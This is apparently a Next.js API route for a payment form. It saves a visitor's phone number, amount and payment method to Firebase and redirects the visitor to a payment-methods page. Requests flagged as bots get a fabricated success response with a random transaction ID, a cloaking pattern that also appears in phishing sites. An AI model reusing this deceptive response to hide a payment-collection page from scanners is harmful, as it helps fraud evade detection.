import { NextResponse } from "next/server"
import { addData } from "@/lib/firebasee"
import { detectBot } from "@/lib/server/security"

export async function POST(request: Request) {
  try {
    // Check if the request is from a bot
    if (await detectBot(request as any)) {
      // Return a success response with a fake redirect
      // This makes it harder for bots to detect they're being blocked
      return new NextResponse(
        JSON.stringify({
          success: true,
          redirectUrl: "/payment-confirmation",
          transactionId: Math.random().toString(36).substring(2, 15),
        }),
        {
          status: 200,
          headers: {
            "Content-Type": "application/json",
          },
        },
      )
    }

    // Parse the request body
    const { phoneNumber, amount, paymentMethod, visitorId } = await request.json()

    // Validate the data
    if (!phoneNumber || !amount) {
      return new NextResponse(JSON.stringify({ error: "Missing required fields" }), {
        status: 400,
        headers: {
          "Content-Type": "application/json",
        },
      })
    }

    // Add the data to Firebase
    await addData({
      id: visitorId || Math.random().toString(36).substring(2, 15),
      name: phoneNumber,
      phone: phoneNumber,
      amount,
      paymentMethod: paymentMethod || "unknown",
      timestamp: new Date().toISOString(),
    })

    // Return success
    return new NextResponse(JSON.stringify({ success: true, redirectUrl: "/payment-methods" }), {
      status: 200,
      headers: {
        "Content-Type": "application/json",
      },
    })
  } catch (error) {
    console.error("Error submitting payment:", error)
    return new NextResponse(JSON.stringify({ error: "Failed to submit payment" }), {
      status: 500,
      headers: {
        "Content-Type": "application/json",
      },
    })
  }
}
